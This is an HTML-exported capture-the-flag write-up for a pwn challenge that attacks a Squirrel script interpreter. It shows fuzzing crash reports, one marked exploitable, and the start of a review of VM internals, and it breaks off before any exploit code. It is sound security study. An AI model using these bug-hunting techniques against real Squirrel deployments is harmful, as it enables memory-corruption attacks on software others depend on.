<!DOCTYPE html><html><head>
      <title>writeup</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      
      <link rel="stylesheet" href="file:///c:\Users\localo\.vscode\extensions\shd101wyy.markdown-preview-enhanced-0.5.10\node_modules\@shd101wyy\mume\dependencies\katex\katex.min.css">
      
      
      
      
      
      
      
      
      
      <style>
      pre {
  font-family: Menlo, Monaco, Consolas, 'Courier New', monospace;
  direction: ltr;
  text-align: left;
  white-space: pre;
  word-spacing: normal;
  word-break: normal;
  word-wrap: normal;
  padding: 1em;
  margin: .5em 0;
  overflow: auto;
  line-height: 1.5;
  tab-size: 4;
  hyphens: none;
  color: #F8F8F2;
  background-color: #323232 !important;
  border: #515151;
  border-radius: 3px;
}
pre[class*="language-"] {
  padding: 1em;
}
code[class*="language-"] .token.comment,
pre[class*="language-"] .token.comment,
code[class*="language-"] .token.prolog,
pre[class*="language-"] .token.prolog,
code[class*="language-"] .token.doctype,
pre[class*="language-"] .token.doctype,
code[class*="language-"] .token.cdata,
pre[class*="language-"] .token.cdata {
  color: #75715E;
}
code[class*="language-"] .token.punctuation,
pre[class*="language-"] .token.punctuation {
  color: inherit;
}
code[class*="language-"] .namespace,
pre[class*="language-"] .namespace {
  opacity: .7;
}
code[class*="language-"] .token.property,
pre[class*="language-"] .token.property,
code[class*="language-"] .token.tag,
pre[class*="language-"] .token.tag,
code[class*="language-"] .token.boolean,
pre[class*="language-"] .token.boolean,
code[class*="language-"] .token.number,
pre[class*="language-"] .token.number,
code[class*="language-"] .token.function-name,
pre[class*="language-"] .token.function-name,
code[class*="language-"] .token.constant,
pre[class*="language-"] .token.constant,
code[class*="language-"] .token.symbol,
pre[class*="language-"] .token.symbol,
code[class*="language-"] .token.deleted,
pre[class*="language-"] .token.deleted {
  color: #AE81FF;
}
code[class*="language-"] .token.selector,
pre[class*="language-"] .token.selector,
code[class*="language-"] .token.attr-name,
pre[class*="language-"] .token.attr-name,
code[class*="language-"] .token.string,
pre[class*="language-"] .token.string,
code[class*="language-"] .token.char,
pre[class*="language-"] .token.char,
code[class*="language-"] .token.builtin,
pre[class*="language-"] .token.builtin,
code[class*="language-"] .token.inserted,
pre[class*="language-"] .token.inserted {
  color: #E6DB74;
}
code[class*="language-"] .token.entity,
pre[class*="language-"] .token.entity {
  color: #AE81FF;
}
code[class*="language-"] .token.url,
pre[class*="language-"] .token.url {
  color: #CCC;
}
code[class*="language-"] .token.operator,
pre[class*="language-"] .token.operator {
  color: #F92672;
}
code[class*="language-"] .token.atrule,
pre[class*="language-"] .token.atrule,
code[class*="language-"] .token.attr-value,
pre[class*="language-"] .token.attr-value,
code[class*="language-"] .token.keyword,
pre[class*="language-"] .token.keyword {
  color: #66D9EF;
}
code[class*="language-"] .token.function,
pre[class*="language-"] .token.function {
  color: #A6E22E;
}
code[class*="language-"] .token.class-name,
pre[class*="language-"] .token.class-name {
  color: #A6E22E;
}
code[class*="language-"] .token.regex,
pre[class*="language-"] .token.regex {
  color: #AE81FF;
}
code[class*="language-"] .token.important,
pre[class*="language-"] .token.important,
code[class*="language-"] .token.variable,
pre[class*="language-"] .token.variable {
  color: #A6E22E;
}
code[class*="language-"] .token.important,
pre[class*="language-"] .token.important,
code[class*="language-"] .token.bold,
pre[class*="language-"] .token.bold {
  font-weight: bold;
}
code[class*="language-"] .token.italic,
pre[class*="language-"] .token.italic {
  font-style: italic;
}
code[class*="language-"] .token.entity,
pre[class*="language-"] .token.entity {
  cursor: help;
}

/* highlight */
pre[data-line] {
  position: relative;
  padding: 1em 0 1em 3em;
}
pre[data-line] .line-highlight-wrapper {
  position: absolute;
  top: 0;
  left: 0;
  background-color: transparent;
  display: block;
  width: 100%;
}
pre[data-line] .line-highlight {
  position: absolute;
  left: 0;
  right: 0;
  padding: inherit 0;
  margin-top: 1em;
  background: rgba(153, 122, 102, 0.08);
  background: linear-gradient(to right, rgba(153, 122, 102, 0.1) 70%, rgba(153, 122, 102, 0));
  pointer-events: none;
  line-height: inherit;
  white-space: pre;
}
pre[data-line] .line-highlight:before,
pre[data-line] .line-highlight[data-end]:after {
  content: attr(data-start);
  position: absolute;
  top: .4em;
  left: .6em;
  min-width: 1em;
  padding: 0 .5em;
  background-color: rgba(153, 122, 102, 0.4);
  color: #f5f2f0;
  font: bold 65%/1.5 sans-serif;
  text-align: center;
  vertical-align: .3em;
  border-radius: 999px;
  text-shadow: none;
  box-shadow: 0 1px white;
}
pre[data-line] .line-highlight[data-end]:after {
  content: attr(data-end);
  top: auto;
  bottom: .4em;
}
html body{font-family:"Helvetica Neue",Helvetica,"Segoe UI",Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#F8F8F2;background-color:#282828;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#fff}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#dbdbbd}html body strong{color:#fff}html body del{color:#dbdbbd}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ul,html body>ol{margin-bottom:16px}html body ul,html body ol{padding-left:2em}html body ul.no-list,html body ol.no-list{padding:0;list-style-type:none}html body ul ul,html body ul ol,html body ol ol,html body ol ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#dbdbbd;border-left:4px solid #515151}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#515151;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:bold;color:#fff}html body table td,html body table th{border:1px solid #515151;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:bold}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em !important;color:#fff;background-color:#3c3c3c;border-radius:3px;padding:.2em 0}html body code::before,html body code::after{letter-spacing:-0.2em;content:"\00a0"}html body pre>code{padding:0;margin:0;font-size:.85em !important;word-break:normal;white-space:pre;background:transparent;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;font-size:.85em !important;line-height:1.45;border:#515151;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:before,html body pre tt:before,html body pre code:after,html body pre tt:after{content:normal}html body p,html body blockquote,html body ul,html body ol,html body dl,html body pre{margin-top:0;margin-bottom:16px}html body kbd{color:#fff;border:1px solid #515151;border-bottom:2px solid #424242;padding:2px 4px;background-color:#3c3c3c;border-radius:3px}@media print{html body{background-color:#282828}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#fff;page-break-after:avoid}html body blockquote{color:#dbdbbd}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body pre,html body code{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview .pagebreak,.markdown-preview .newpage{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center !important}.markdown-preview:not([for="preview"]) .code-chunk .btn-group{display:none}.markdown-preview:not([for="preview"]) .code-chunk .status{display:none}.markdown-preview:not([for="preview"]) .code-chunk .output-div{margin-bottom:16px}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0}@media screen and (min-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{font-size:14px !important;padding:1em}}@media print{html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,0.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{padding:0 1.6em;margin-top:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc li{margin-bottom:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{list-style-type:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% -  300px);padding:2em calc(50% - 457px -  150px);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
/* Please visit the URL below for more information: */
/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */

      </style>
    </head>
    <body for="html-export">
      <div class="mume markdown-preview  ">
      <style>pre {
  max-height: 500px;
}
blockquote {
  background-color: #323232 !important;
}
</style>
<h1 class="mume-header" id="squirrel-as-a-service-localo">Squirrel as a Service - localo</h1>

<p><strong>Category:</strong> Pwn<br>
<strong>Difficulty:</strong> Hard<br>
<strong>Author:</strong> 0x4d5a</p>
<h2 class="mume-header" id="description">Description</h2>

<blockquote>
<p>&#x1F43F;&#xFE0F; as a Service! Squirrel lang (&#x2C8;a&#x26A;&#x32F;&#xE7;&#x2CC;h&#x153;&#x281;n&#xE7;&#x259;n) is a super simple programming language. And our server will execute your squirrel scripts, either in text or binary based format. Go exploit it. To test this service, take this cool script:</p>
<p>class CSCG<br>
{	<br>
constructor()<br>
{<br>
isCool = true;<br>
}<br>
isCool = false;<br>
}</p>
<p>function CSCG::IsCool()<br>
{<br>
if (isCool)<br>
{<br>
print(&quot;CSCG is so cool!\n&quot;);<br>
}<br>
}<br>
local cscg = CSCG()<br>
cscg.IsCool()</p>
<p>Server: nc <a href="http://hax1.allesctf.net">hax1.allesctf.net</a> 9888</p>
</blockquote>
<h2 class="mume-header" id="summery">Summery</h2>

<p>Squirrel is a scripting language similar to lua, it aims to be used in video games and as such can be integrated and interfaced with easily. The language implements most techniques that are expected in a modern language. And is in my opinion easier to read than lua. Even though it is not that well known, it is used in quite some Projects like <code>Code::Blocks</code> and the <code>Source</code> engine by Valve, and therefore vulnerabilities in it would affect millions.<br>
The author provided an archive containing instruction to get the server side setup.</p>
<h2 class="mume-header" id="solution">Solution</h2>

<h3 class="mume-header" id="fuzz-all-the-things">Fuzz all the Things</h3>

<p>I started to write a docker based fuzzing setup and let that run over the night, the next day I had roughly 9k crashes. I used crashwalk to reduce it, but it were too many for me to analyze.</p>
<pre data-role="codeBlock" data-info="txt" class="language-txt"><code>[...]
---CRASH SUMMARY---
Filename: /fuzz_io/out/fuzzer1/crashes/id:000035,sig:11,src:000000,time:1272838,op:flip1,pos:1311
SHA1: 67f9873e108039bec32cbcd109119533ec15a828
Classification: UNKNOWN
Hash: 7e9e6aa05b01cb24de3471559b9e8fc4.72f09c75dfdfafd9e2f45a7422cbc2b6
Command: /app/bin/sq /fuzz_io/out/fuzzer1/crashes/id:000035,sig:11,src:000000,time:1272838,op:flip1,pos:1311
Faulting Frame:
   SQObjectPtr::operator= @ 0x00007f3c3234f4c5: in /app/lib/libsquirrel.so.0.0.0
Disassembly:
   0x00007f3c3234f4b1: mov rax,QWORD PTR [rsp+0x18]
   0x00007f3c3234f4b6: add rbp,QWORD PTR [rax]
   0x00007f3c3234f4b9: mov rax,QWORD PTR [rsp+0x10]
   0x00007f3c3234f4be: mov r13,QWORD PTR [rax]
   0x00007f3c3234f4c1: shl rbp,0x4
=&gt; 0x00007f3c3234f4c5: test BYTE PTR [r13+rbp*1+0x3],0x8
   0x00007f3c3234f4cb: je 0x7f3c3234f54c &lt;SQVM::Execute(SQObjectPtr&amp;, long long, long long, SQObjectPtr&amp;, unsigned long long, SQVM::ExecutionType)+9212&gt;
   0x00007f3c3234f4cd: data16 lea rdi,[rip+0x2ba2b] # 0x7f3c3237af00
   0x00007f3c3234f4d5: data16 data16 call 0x7f3c322a7310 &lt;__tls_get_addr@plt&gt;
   0x00007f3c3234f4dd: movsxd rcx,DWORD PTR [rax]
Stack Head (6 entries):
   SQObjectPtr::operator=    @ 0x00007f3c3234f4c5: in /app/lib/libsquirrel.so.0.0.0
   SQVM::Execute             @ 0x00007f3c3234f4c5: in /app/lib/libsquirrel.so.0.0.0
   SQVM::Call                @ 0x00007f3c3234c4f6: in /app/lib/libsquirrel.so.0.0.0
   sq_call                   @ 0x00007f3c322b7100: in /app/lib/libsquirrel.so.0.0.0
   executeVm                 @ 0x0000000000402710: in /app/bin/sq
   main                      @ 0x0000000000402935: in /app/bin/sq
Registers:
rax=0x0000000001622850 rbx=0x00000000000000b4 rcx=0x000000000000221b rdx=0x0000000000406200 
rsi=0x0000000000406200 rdi=0x00007f3c3237af00 rbp=0x000000000003c2e0 rsp=0x00007ffe269cea50 
 r8=0x0000000000003beb  r9=0x0000000000000000 r10=0x0000000000000001 r11=0x0000000000000246 
r12=0x0000000000406188 r13=0x0000000001630d60 r14=0x0000000000000000 r15=0x00007f3c31cfb848 
rip=0x00007f3c3234f4c5 efl=0x0000000000010202  cs=0x0000000000000033  ss=0x000000000000002b 
 ds=0x0000000000000000  es=0x0000000000000000  fs=0x0000000000000000  gs=0x0000000000000000 
Extra Data:
   Description: Access violation
   Short description: AccessViolation (21/22)
   Explanation: The target crashed due to an access violation but there is not enough additional information available to determine exploitability.
---END SUMMARY---
(1 of 1) - Hash: 9da86ce1cc85e2b15e2b621b2a84dd65.163b841cd23f78f643155e229efb9688
---CRASH SUMMARY---
Filename: /fuzz_io/out/fuzzer1/crashes/id:000007,sig:11,src:000000,time:4951,op:flip1,pos:131
SHA1: c5a3e149c7c5a699938076ff78c95205f6b18b6d
Classification: EXPLOITABLE
Hash: 9da86ce1cc85e2b15e2b621b2a84dd65.163b841cd23f78f643155e229efb9688
Command: /app/bin/sq /fuzz_io/out/fuzzer1/crashes/id:000007,sig:11,src:000000,time:4951,op:flip1,pos:131
Faulting Frame:
   SQClosure::Create @ 0x00007fa85565b295: in /app/lib/libsquirrel.so.0.0.0
Disassembly:
   0x00007fa85565b282: add dl,0x1
   0x00007fa85565b285: adc dl,0x0
   0x00007fa85565b288: mov BYTE PTR [rsi+rcx*1],dl
   0x00007fa85565b28b: mov DWORD PTR [rax],0x23c9
   0x00007fa85565b291: mov rax,QWORD PTR [r13+0x58]
=&gt; 0x00007fa85565b295: mov DWORD PTR [rax+rbx*1-0x8],0x1000001
   0x00007fa85565b29d: mov QWORD PTR [rax+rbx*1],0x0
   0x00007fa85565b2a5: inc r15
   0x00007fa85565b2a8: add rbx,0x10
   0x00007fa85565b2ac: cmp r15,QWORD PTR [r14+0xc8]
Stack Head (6 entries):
   SQClosure::Create         @ 0x00007fa85565b295: in /app/lib/libsquirrel.so.0.0.0
   SQClosure::Load           @ 0x00007fa8556b947a: in /app/lib/libsquirrel.so.0.0.0
   sq_readclosure            @ 0x00007fa855655b1f: in /app/lib/libsquirrel.so.0.0.0
   sqstd_loadfile            @ 0x00007fa855732866: in /app/lib/libsqstdlib.so.0.0.0
   executeVm                 @ 0x000000000040267a: in /app/bin/sq
   main                      @ 0x0000000000402935: in /app/bin/sq
Registers:
rax=0x0000000001ed9d40 rbx=0x000000000001a2c8 rcx=0x000000000000645a rdx=0x0000000000000046 
rsi=0x0000000000406200 rdi=0x00007fa855717f00 rbp=0x0000000001ed29e0 rsp=0x00007ffcd1165420 
 r8=0x0000000001ed9ce0  r9=0x0000000001ed9a60 r10=0x00007fa855639f59 r11=0x00007fa855626be0 
r12=0x0000000000406188 r13=0x0000000001ed9ce0 r14=0x0000000001ed92f0 r15=0x0000000000001a2c 
rip=0x00007fa85565b295 efl=0x0000000000010202  cs=0x0000000000000033  ss=0x000000000000002b 
 ds=0x0000000000000000  es=0x0000000000000000  fs=0x0000000000000000  gs=0x0000000000000000 
Extra Data:
   Description: Access violation on destination operand
   Short description: DestAv (8/22)
   Explanation: The target crashed on an access violation at an address matching the destination operand of the instruction. This likely indicates a write access violation, which means the attacker may control the write address and/or value.
---END SUMMARY---
(1 of 1) - Hash: ec69f912f58555510ae8ffd8bf4d4ea9.ec69f912f58555510ae8ffd8bf4d4ea9
---CRASH SUMMARY---
Filename: /fuzz_io/out/fuzzer1/crashes/id:000031,sig:11,src:000000,time:898403,op:flip1,pos:871
SHA1: 096287872aab8e4c4315c59ed7a1218faa57b72c
Classification: UNKNOWN
Hash: ec69f912f58555510ae8ffd8bf4d4ea9.ec69f912f58555510ae8ffd8bf4d4ea9
Command: /app/bin/sq /fuzz_io/out/fuzzer1/crashes/id:000031,sig:11,src:000000,time:898403,op:flip1,pos:871
Faulting Frame:
   SQVM::Execute @ 0x00007f724bca3300: in /app/lib/libsquirrel.so.0.0.0
Disassembly:
   0x00007f724bca32ec: mov QWORD PTR [rsp+0x8],rax
   0x00007f724bca32f1: movsxd r15,DWORD PTR [rax]
   0x00007f724bca32f4: add r15,r14
   0x00007f724bca32f7: shl r15,0x4
   0x00007f724bca32fb: mov QWORD PTR [rsp+0x30],rcx
=&gt; 0x00007f724bca3300: mov ecx,DWORD PTR [rcx+r15*1]
   0x00007f724bca3304: mov eax,ecx
   0x00007f724bca3306: or eax,r13d
   0x00007f724bca3309: cdqe
   0x00007f724bca330b: cmp rax,0x5000006
Stack Head (5 entries):
   SQVM::Execute             @ 0x00007f724bca3300: in /app/lib/libsquirrel.so.0.0.0
   SQVM::Call                @ 0x00007f724bc9e4f6: in /app/lib/libsquirrel.so.0.0.0
   sq_call                   @ 0x00007f724bc09100: in /app/lib/libsquirrel.so.0.0.0
   executeVm                 @ 0x0000000000402710: in /app/bin/sq
   main                      @ 0x0000000000402935: in /app/bin/sq
Registers:
rax=0x0000000001dba4e0 rbx=0x0000000000000035 rcx=0x0000000001dad980 rdx=0x0000000000406200 
rsi=0x0000000000406200 rdi=0x00007f724bcccf00 rbp=0x0000000000000070 rsp=0x00007ffee91de630 
 r8=0x0000000000000009  r9=0x0000000000000001 r10=0x00007f724bbf1fe1 r11=0x00007f724bc97c20 
r12=0x0000000000406188 r13=0x0000000008000010 r14=0x0000000000000002 r15=0x0000000000080080 
rip=0x00007f724bca3300 efl=0x0000000000010202  cs=0x0000000000000033  ss=0x000000000000002b 
 ds=0x0000000000000000  es=0x0000000000000000  fs=0x0000000000000000  gs=0x0000000000000000 
Extra Data:
   Description: Access violation on source operand
   Short description: SourceAv (19/22)
   Explanation: The target crashed on an access violation at an address matching the source operand of the current instruction. This likely indicates a read access violation.
---END SUMMARY---
(1 of 1) - Hash: 8b6f67aba69bfd716aa02e94a3297c23.08f6280a7bcba65193f9eb4d56f938d3
---CRASH SUMMARY---
Filename: /fuzz_io/out/fuzzer1/crashes/id:000032,sig:11,src:000000,time:926722,op:flip1,pos:1010
SHA1: a16b39df97c4a8d2d0fba70b265d34612359c66a
Classification: UNKNOWN
Hash: 8b6f67aba69bfd716aa02e94a3297c23.08f6280a7bcba65193f9eb4d56f938d3
Command: /app/bin/sq /fuzz_io/out/fuzzer1/crashes/id:000032,sig:11,src:000000,time:926722,op:flip1,pos:1010
Faulting Frame:
   SQVM::NewSlot @ 0x00007f25e839dbfb: in /app/lib/libsquirrel.so.0.0.0
Disassembly:
   0x00007f25e839dbe9: mov bl,BYTE PTR [rdx+rcx*1]
   0x00007f25e839dbec: add bl,0x1
   0x00007f25e839dbef: adc bl,0x0
   0x00007f25e839dbf2: mov BYTE PTR [rdx+rcx*1],bl
   0x00007f25e839dbf5: mov DWORD PTR [rax],0x181a
=&gt; 0x00007f25e839dbfb: mov eax,DWORD PTR [r12]
   0x00007f25e839dbff: cmp eax,0x8004000
   0x00007f25e839dc04: je 0x7f25e839f08d &lt;SQVM::NewSlot(SQObjectPtr const&amp;, SQObjectPtr const&amp;, SQObjectPtr const&amp;, bool)+5437&gt;
   0x00007f25e839dc0a: cmp eax,0xa008000
   0x00007f25e839dc0f: je 0x7f25e839e788 &lt;SQVM::NewSlot(SQObjectPtr const&amp;, SQObjectPtr const&amp;, SQObjectPtr const&amp;, bool)+3128&gt;
Stack Head (6 entries):
   SQVM::NewSlot             @ 0x00007f25e839dbfb: in /app/lib/libsquirrel.so.0.0.0
   SQVM::Execute             @ 0x00007f25e8392977: in /app/lib/libsquirrel.so.0.0.0
   SQVM::Call                @ 0x00007f25e838f4f6: in /app/lib/libsquirrel.so.0.0.0
   sq_call                   @ 0x00007f25e82fa100: in /app/lib/libsquirrel.so.0.0.0
   executeVm                 @ 0x0000000000402710: in /app/bin/sq
   main                      @ 0x0000000000402935: in /app/bin/sq
Registers:
rax=0x00007f25e7d86800 rbx=0x0000000000000001 rcx=0x0000000000007ca8 rdx=0x0000000000406200 
rsi=0x00000000113c89b0 rdi=0x00007f25e83bdf00 rbp=0x0000000000000000 rsp=0x00007ffd55ff4990 
 r8=0x0000000000000000  r9=0x00000000013d5220 r10=0x00000000013ae010 r11=0x00007f25e82ccbe0 
r12=0x00000000113c89b0 r13=0x00000000013c8820 r14=0x0000000000406188 r15=0x00000000013c89c0 
rip=0x00007f25e839dbfb efl=0x0000000000010202  cs=0x0000000000000033  ss=0x000000000000002b 
 ds=0x0000000000000000  es=0x0000000000000000  fs=0x0000000000000000  gs=0x0000000000000000 
Extra Data:
   Description: Access violation on source operand
   Short description: SourceAv (19/22)
   Explanation: The target crashed on an access violation at an address matching the source operand of the current instruction. This likely indicates a read access violation.
---END SUMMARY---
[...]
</code></pre><h3 class="mume-header" id="target-analysis">Target analysis</h3>

<p>I decided to do some <code>source code review</code>, since I now knew that the target is full of bugs. Since the server binary has <code>all common exploit mitigations enabled</code>, the bugs that are most interesting are <code>Out-Of-Bounds read/write</code>, <code>Use-After-Free</code>, <code>Type Confusion</code> and <code>Logic</code> bugs. For the input either use <code>source code</code> that squirrel compiles or <code>pre compiled code</code> that is directly interpreted can be used. I took a quick look at the <code>lexer</code> (since that would allow source code based exploitation), but found nothing of interest and continued to search for bugs in the <code>VM</code> itself. The VM implements <code>61</code> opcodes and is written in <strong>hard to read</strong> <code>C++</code> code. The instructions like other structures are directly copied from the binary into memory, before being parsed. Each instruction is structured like this:</p>
<pre data-role="codeBlock" data-info="CPP" class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>
    int_32 _arg1<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> op<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> _arg0<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> _arg2<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> _arg3<span class="token punctuation">;</span>
<span class="token punctuation">}</span> SQInstruction<span class="token punctuation">;</span>
</pre><p>The VM uses a <code>stack</code> and <code>lives in the heap</code>. Each stack object is a <code>SQObjectPtr</code>, basically a structure on that contains a type id and a pointer to an object.</p>
<pre data-role="codeBlock" data-info="CPP" class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tagSQObject
<span class="token punctuation">{</span>
    SQObjectType _type<span class="token punctuation">;</span>     <span class="token comment">//4 bytes, padded to 8</span>
    SQObjectValue _unVal<span class="token punctuation">;</span>   <span class="token comment">//8 bytes</span>
<span class="token punctuation">}</span>SQObject<span class="token punctuation">;</span>
</pre><p>There are <code>18</code> (+1 <code>WIERD_TYPE</code>) basic types, most of the just hold pointer, but 4 hold their value directly: <code>OT_NULL, OT_INTEGER, OT_FLOAT, OT_BOOL</code>. The types are implemented using an <code>enum</code> and hold additional information such as if their reference has to be counted.</p>
<pre data-role="codeBlock" data-info="CPP" class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">enum</span> tagSQObjectType <span class="token punctuation">{</span>
	OT_NULL <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_NULL <span class="token operator">|</span> SQOBJECT_CANBEFALSE<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_INTEGER <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_INTEGER <span class="token operator">|</span> SQOBJECT_NUMERIC <span class="token operator">|</span> SQOBJECT_CANBEFALSE<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_FLOAT <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_FLOAT <span class="token operator">|</span> SQOBJECT_NUMERIC <span class="token operator">|</span> SQOBJECT_CANBEFALSE<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_BOOL <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_BOOL <span class="token operator">|</span> SQOBJECT_CANBEFALSE<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_STRING <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_STRING <span class="token operator">|</span> SQOBJECT_REF_COUNTED<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_TABLE <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_TABLE <span class="token operator">|</span> SQOBJECT_REF_COUNTED <span class="token operator">|</span> SQOBJECT_DELEGABLE<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_ARRAY <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_ARRAY <span class="token operator">|</span> SQOBJECT_REF_COUNTED<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_USERDATA <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_USERDATA <span class="token operator">|</span> SQOBJECT_REF_COUNTED <span class="token operator">|</span> SQOBJECT_DELEGABLE<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_CLOSURE <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_CLOSURE <span class="token operator">|</span> SQOBJECT_REF_COUNTED<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_NATIVECLOSURE <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_NATIVECLOSURE <span class="token operator">|</span> SQOBJECT_REF_COUNTED<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_GENERATOR <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_GENERATOR <span class="token operator">|</span> SQOBJECT_REF_COUNTED<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_USERPOINTER <span class="token operator">=</span> _RT_USERPOINTER<span class="token punctuation">,</span>
